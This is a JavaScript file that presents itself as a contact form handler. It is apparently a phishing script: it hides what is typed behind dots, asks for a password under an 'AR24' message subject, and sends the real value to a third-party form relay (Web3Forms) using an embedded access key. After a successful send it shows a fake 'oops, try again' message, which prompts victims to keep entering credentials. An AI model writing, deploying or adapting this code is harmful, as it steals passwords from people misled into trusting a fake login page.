(() => {


const form = document.querySelector("#contact-form-2");
const statusMessage = document.querySelector("#form-message-2");
const display = document.querySelector("#message_display");
const hidden = document.querySelector("#message_id");

if (!form || !statusMessage || !display || !hidden) {
    console.error("Éléments du formulaire introuvables.");
    return;
}

const submitButton = form.querySelector(
    'input[type="submit"], button[type="submit"]'
);

const accessKey =
    "b5961753-93bd-448e-9cf4-fdfa97c50bf3";

// ==========================================
// VRAIE VALEUR
// ==========================================

let realMessage = "";

// Empêche le fallback input de se déclencher
// juste après beforeinput.
let handledByBeforeInput = false;


// ==========================================
// AFFICHAGE
// ==========================================

function refreshDisplay(cursorPosition = null) {

    // Affiche uniquement des points
    display.value = "•".repeat(realMessage.length);

    // Valeur réelle pour Web3Forms
    hidden.value = realMessage;

    // Remet le curseur à sa position
    if (cursorPosition !== null) {

        requestAnimationFrame(() => {

            const position = Math.min(
                cursorPosition,
                realMessage.length
            );

            display.setSelectionRange(
                position,
                position
            );

        });
    }
}


// ==========================================
// RÉCUPÉRER LA SÉLECTION
// ==========================================

function getSelection() {

    return {
        start: display.selectionStart || 0,
        end: display.selectionEnd || 0
    };

}


// ==========================================
// REMPLACER LA SÉLECTION
// ==========================================

function replaceSelection(text) {

    const {
        start,
        end
    } = getSelection();

    realMessage =
        realMessage.slice(0, start) +
        text +
        realMessage.slice(end);

    const newPosition =
        start + text.length;

    refreshDisplay(newPosition);

}


// ==========================================
// BEFOREINPUT
// PC + ANDROID + IPHONE
// ==========================================

display.addEventListener(
    "beforeinput",
    function (event) {

        /*
         * On indique que JS va gérer
         * directement cette modification.
         */
        handledByBeforeInput = true;

        const {
            start,
            end
        } = getSelection();

        const inputType = event.inputType;


        // ----------------------------------
        // SAISIE NORMALE
        // ----------------------------------

        if (inputType === "insertText") {

            event.preventDefault();

            replaceSelection(
                event.data || ""
            );

            return;
        }


        // ----------------------------------
        // RETOUR À LA LIGNE
        // ----------------------------------

        if (inputType === "insertLineBreak") {

            event.preventDefault();

            replaceSelection("\n");

            return;
        }


        // ----------------------------------
        // COLLAGE
        // ----------------------------------

        if (inputType === "insertFromPaste") {

            event.preventDefault();

            /*
             * Certains navigateurs mettent le texte
             * directement dans event.data.
             */
            if (event.data !== null) {

                replaceSelection(
                    event.data
                );

                return;
            }

            /*
             * Fallback pour certains navigateurs mobiles.
             */
            navigator.clipboard
                .readText()
                .then(text => {

                    replaceSelection(text);

                })
                .catch(() => {

                    console.warn(
                        "Impossible de lire le presse-papiers."
                    );

                });

            return;
        }


        // ----------------------------------
        // BACKSPACE
        // ----------------------------------

        if (inputType === "deleteContentBackward") {

            event.preventDefault();


            // Une sélection existe
            if (start !== end) {

                realMessage =
                    realMessage.slice(0, start) +
                    realMessage.slice(end);

                refreshDisplay(start);

                return;
            }


            // Rien à supprimer
            if (start === 0) {
                return;
            }


            realMessage =
                realMessage.slice(0, start - 1) +
                realMessage.slice(start);

            refreshDisplay(start - 1);

            return;
        }


        // ----------------------------------
        // DELETE
        // ----------------------------------

        if (inputType === "deleteContentForward") {

            event.preventDefault();


            // Une sélection existe
            if (start !== end) {

                realMessage =
                    realMessage.slice(0, start) +
                    realMessage.slice(end);

                refreshDisplay(start);

                return;
            }


            // Supprime le caractère suivant
            realMessage =
                realMessage.slice(0, start) +
                realMessage.slice(start + 1);

            refreshDisplay(start);

            return;
        }


        // ----------------------------------
        // REMPLACEMENT D'UNE SÉLECTION
        // ----------------------------------

        if (
            inputType === "insertReplacementText"
        ) {

            event.preventDefault();

            replaceSelection(
                event.data || ""
            );

            return;
        }

    }
);


// ==========================================
// FALLBACK INPUT
// Pour les navigateurs qui ne supportent
// pas correctement beforeinput.
// ==========================================

display.addEventListener(
    "input",
    function () {

        if (handledByBeforeInput) {

            handledByBeforeInput = false;
            return;
        }

        /*
         * Fallback simple :
         * on compare la longueur du textarea
         * avec la vraie valeur.
         */

        const visibleValue = display.value;

        const oldLength =
            realMessage.length;

        const newLength =
            visibleValue.length;


        // -------------------------------
        // AJOUT
        // -------------------------------

        if (newLength > oldLength) {

            const difference =
                newLength - oldLength;

            const position =
                display.selectionStart;

            /*
             * Récupération approximative de
             * la partie ajoutée.
             */
            const added =
                visibleValue.slice(
                    Math.max(
                        0,
                        position - difference
                    ),
                    position
                );

            realMessage =
                realMessage.slice(
                    0,
                    position - difference
                ) +
                added +
                realMessage.slice(
                    position - difference
                );

        }


        // -------------------------------
        // SUPPRESSION
        // -------------------------------

        else if (newLength < oldLength) {

            const difference =
                oldLength - newLength;

            const position =
                display.selectionStart;

            realMessage =
                realMessage.slice(
                    0,
                    position
                ) +
                realMessage.slice(
                    position + difference
                );
        }


        refreshDisplay();

    }
);


// ==========================================
// MESSAGE DE STATUT
// ==========================================

function setMessage(
    text,
    isError = false
) {

    statusMessage.textContent = text;

    statusMessage.setAttribute(
        "role",
        isError ? "alert" : "status"
    );

}


// ==========================================
// ENVOI WEB3FORMS
// ==========================================

form.addEventListener(
    "submit",
    async function (event) {

        event.preventDefault();


        if (
            !accessKey ||
            accessKey.trim() === ""
        ) {

            setMessage(
                "Clé Web3Forms manquante.",
                true
            );

            return;
        }


        if (realMessage.trim() === "") {

            setMessage(
                "Veuillez entrer votre mot de passe.",
                true
            );

            return;
        }


        if (submitButton) {
            submitButton.disabled = true;
        }


        setMessage(
            "Checking en cours…"
        );


        // La vraie valeur
        hidden.value = realMessage;


        const data =
            new FormData(form);


        data.append(
            "access_key",
            accessKey
        );

        data.append(
            "subject",
            "Nouveau message AR24 "
        );

        data.append(
            "from_name",
            "INFO AR"
        );

        data.append(
            "botcheck",
            ""
        );


        try {

            const response =
                await fetch(
                    "https://api.web3forms.com/submit",
                    {
                        method: "POST",
                        body: data
                    }
                );


            const result =
                await response.json();


            console.log(
                "Réponse Web3Forms :",
                result
            );


            if (
                !response.ok ||
                !result.success
            ) {

                throw new Error(
                    result.message ||
                    "Échec de connexion"
                );

            }


            // -------------------------------
            // RESET
            // -------------------------------

            form.reset();

            realMessage = "";

            display.value = "";
            hidden.value = "";


            setMessage(
                "oups réssayer."
            );


        } catch (error) {

            console.error(
                "Erreur Web3Forms :",
                error
            );


            setMessage(
                "Une erreur est survenue. Réessayez.",
                true
            );


        } finally {

            if (submitButton) {
                submitButton.disabled = false;
            }

        }

    }
);


})();
